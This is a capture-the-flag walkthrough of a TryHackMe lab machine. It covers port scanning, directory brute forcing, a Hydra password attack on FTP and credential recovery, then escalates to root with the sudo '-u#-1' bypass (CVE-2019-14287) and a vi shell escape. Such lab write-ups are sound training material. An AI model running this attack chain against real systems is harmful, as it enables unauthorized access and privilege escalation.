# Year of the Rabbit

Room: [TryHackMe Year of the Rabbit](https://tryhackme.com/room/yearoftherabbit)

## Reconnaissance

First, I checked whether the target machine was accessible.

```bash
ping 10.49.179.110
```

The machine responded successfully, confirming connectivity.

To quickly identify open ports, I used RustScan.

```bash
rustscan -a 10.49.179.110
```

Open ports discovered:

```text
21/tcp → FTP
22/tcp → SSH
80/tcp → HTTP
```

Next, I performed a detailed scan using Nmap.

```bash
nmap -sC -sV -p21,22,80 10.49.179.110 -oN nmap.txt
```

Result:

```text
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5
80/tcp open  http    Apache 2.4.10
```


## Web Enumeration

Since the machine was running a web server, I visited the website.

The page displayed the default Apache page.

To discover hidden directories, I used Gobuster.

```bash
gobuster dir -u http://10.49.179.110/ \
-w /usr/share/wordlists/dirb/common.txt
```

Interesting result:

```text
/assets
```

Inside `/assets`, I inspected the stylesheet and found a hidden comment.

```css
/* Nice to see someone checking the stylesheets.
   Take a look at the page:
/sup3r_s3cr3t_fl4g.php
*/
```

This revealed another endpoint.

```text
/sup3r_s3cr3t_fl4g.php
```


## Hidden Directory Discovery

When visiting the page, it requested disabling JavaScript.

Even after disabling JavaScript, I couldn’t find anything useful.

So I intercepted the request using Burp Suite.

While checking the request, I discovered a hidden parameter.

```http
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
```

Visiting:

```text
http://10.49.179.110/WExYY2Cv-qU/
```

I found a file.

```text
Hot_Babe.png
```


## Extracting FTP Credentials

I downloaded the image and checked for hidden strings.

```bash
strings Hot_Babe.png
```

Inside the output, I found this message.

```text
Username for FTP is ftpuser
One of these is the password
```

Below it was a list of possible passwords.

So I saved them into a wordlist.


## FTP Brute Force

Using Hydra, I tested the password list.

```bash
hydra -l ftpuser -P passlist.txt ftp://10.49.179.110 -t 4
```

Hydra found valid credentials.

```text
Username: ftpuser
Password: 5iez****KfPKQ
```


## FTP Enumeration

I logged into the FTP service.

```bash
ftp 10.49.179.110
```

Inside, I found:

```text
Eli's_Creds.txt
```

Downloaded it.

```bash
get Eli's_Creds.txt
```

Contents:

```text
+++++ ++++[ ->+++ +++++ +<]>+ +++.< ...
```

It looked like **Brainfuck encoded text**.

After decoding, I got:

```text
User: eli
Password: DSp****wAEwid
```


## SSH Access as Eli

Using the recovered credentials, I connected via SSH.

```bash
ssh eli@10.49.179.110
```

After login, a system message appeared.

```text
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you.
Check our leet s3cr3t hiding place.
I've left you a hidden message there"
```

This revealed another username.

```text
gwendoline
```

It also hinted at a hidden location.


## Finding Gwendoline Credentials

Based on the message, I searched the filesystem.

```bash
find / -iname "*s3cr3t*" 2>/dev/null
```

Interesting result:

```text
/usr/games/s3cr3t
```

Inside this directory, I found a hidden file.

```text
.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

Reading it revealed:

```text
Your password is awful, Gwendoline.
It should be at least 60 characters long!
Not just Mni****hQHUNI
```

Recovered password:

```text
Mni****hQHUNI
```


## SSH Access as Gwendoline

Using the new credentials, I logged in.

```bash
ssh gwendoline@10.49.179.110
```

Inside the home directory, I found the user flag.

```bash
cat user.txt
```

```text
THM{1107174691*********d2b5bdb5740b1589bae53}
```


## Privilege Escalation

To check for privilege escalation opportunities, I ran:

```bash
sudo -l
```

Output:

```text
User gwendoline may run the following commands on this machine:
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

At first glance this looks restricted.

It means:

```text
Gwendoline can run vi as ANY user
BUT cannot run commands directly as root
No password required
```

The important part is:

```text
(ALL, !root)
```

The administrator tried to block root access by explicitly denying UID 0.


### Sudo Vulnerability

This machine was vulnerable to:

`CVE-2019-14287`

This vulnerability affects older versions of Sudo.

The issue happens because sudo incorrectly handles **negative user IDs**.

Normally:

```bash
sudo -u root command
```

means:

```text
Run command as UID 0 (root)
```

and sudo blocks it.

But when supplying:

```bash
sudo -u#-1 command
```

internally:

```text
-1
↓
converted into unsigned integer
↓
4294967295
↓
sudo misinterprets this value
↓
restriction gets bypassed
```

Because of this bug, even though root was blocked, sudo accidentally executed commands as root.


## Getting Root Shell

To exploit the vulnerability:

```bash
sudo -u#-1 vi /home/gwendoline/user.txt
```

This opens vi with root privileges.

Inside vi, I verified it.

```vim
:!id
```

Output:

```text
uid=0(root)
```

Since Vim allows shell escapes, I spawned a shell.

```vim
:!bash
```

Now I had a root shell.

```bash
whoami
```

Output:

```text
root
```

After getting root, I accessed the root directory.

```bash
cd /root
ls
```

Found:

```text
root.txt
```

Reading the file:

```bash
cat root.txt
```

Root flag:

```text
THM{8d6f163a87*********a4fd61aef0f3a0ecf9161}
```

DONE!!!!!!!!!!!
